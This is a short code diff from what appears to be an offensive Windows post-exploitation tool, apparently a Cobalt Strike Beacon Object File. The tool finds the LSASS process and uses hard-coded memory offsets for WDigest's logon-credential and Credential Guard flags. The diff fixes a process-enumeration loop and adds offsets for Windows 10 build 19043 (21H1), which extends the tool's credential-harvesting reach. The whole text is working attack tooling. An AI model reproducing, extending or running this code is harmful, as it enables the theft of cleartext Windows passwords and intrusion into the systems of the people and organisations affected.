@@ -249,7 +249,7 @@ DWORD GetLsassPid(LPCWSTR lpwLsass) {
 			break;
 		}
 
-	} while (pProcInfo);
+	} while (pProcInfo && pProcInfo->NextEntryDelta);
 
 CleanUp:
 
@@ -358,6 +358,10 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		credGuardEnabled_offset = 0x35c08;
 	}
 	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 19042 && dwUBR >= 630) { // v20H2
+		logonCredential_offSet = 0x361b4;
+		credGuardEnabled_offset = 0x35c08;
+	}
+	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 19043 && dwUBR >= 630) { // v21H1
 		logonCredential_offSet = 0x361b4;
 		credGuardEnabled_offset = 0x35c08;
 	}
